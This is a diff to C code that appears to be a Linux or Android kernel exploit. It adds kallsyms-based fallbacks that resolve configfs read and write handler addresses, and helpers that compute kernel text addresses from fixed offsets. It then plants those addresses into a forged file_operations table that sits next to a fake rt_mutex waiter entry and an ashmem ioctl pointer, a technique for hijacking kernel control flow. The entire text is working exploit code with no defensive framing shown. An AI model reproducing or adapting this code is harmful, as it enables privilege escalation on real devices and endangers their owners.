@@ -82,12 +82,20 @@ void resolve_missing_offsets(void) {
     rt_configfs_read_iter = resolve_sym_addr("configfs_read_iter");
     if (rt_configfs_read_iter)
       pr_info("  configfs_read_iter: resolved 0x%lx\n", rt_configfs_read_iter);
+    else
+      rt_configfs_read_iter = resolve_sym_addr("configfs_read_file");
+    if (rt_configfs_read_iter)
+      pr_info("  configfs_read_file: resolved 0x%lx\n", rt_configfs_read_iter);
   }
 
   if (CONFIGFS_BIN_WRITE_ITER_OFF == 0) {
     rt_configfs_bin_write_iter = resolve_sym_addr("configfs_bin_write_iter");
     if (rt_configfs_bin_write_iter)
       pr_info("  configfs_bin_write_iter: resolved 0x%lx\n", rt_configfs_bin_write_iter);
+    else
+      rt_configfs_bin_write_iter = resolve_sym_addr("configfs_write_file");
+    if (rt_configfs_bin_write_iter)
+      pr_info("  configfs_write_file: resolved 0x%lx\n", rt_configfs_bin_write_iter);
   }
 
   /* Symbols below are static/unexported - will fail from kallsyms */
@@ -173,6 +181,12 @@ uint64_t get_copy_splice_read_addr(void) {
 uint64_t get_configfs_read_iter_addr(void) {
   if (rt_configfs_read_iter) return rt_configfs_read_iter;
   return text_addr(KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF);
+}
+uint64_t get_configfs_read_addr(void) {
+  return text_addr(KIMAGE_TEXT_BASE + CONFIGFS_READ_OFF);
+}
+uint64_t get_configfs_write_addr(void) {
+  return text_addr(KIMAGE_TEXT_BASE + CONFIGFS_WRITE_OFF);
 }
 uint64_t get_configfs_bin_write_iter_addr(void) {
   if (rt_configfs_bin_write_iter) return rt_configfs_bin_write_iter;
@@ -496,8 +510,8 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
   put64(p, off + FOPS_LLSEEK_OFF,
         fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, off + FOPS_READ_OFF, 0);
-  put64(p, off + FOPS_WRITE_OFF, 0);
+  put64(p, off + FOPS_READ_OFF, get_configfs_read_addr());
+  put64(p, off + FOPS_WRITE_OFF, get_configfs_write_addr());
   put64(p, off + FOPS_READ_ITER_OFF, get_configfs_read_iter_addr());
   put64(p, off + FOPS_WRITE_ITER_OFF, get_configfs_bin_write_iter_addr());
   put64(p, off + FOPS_IOCTL_OFF, text_addr(KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF));
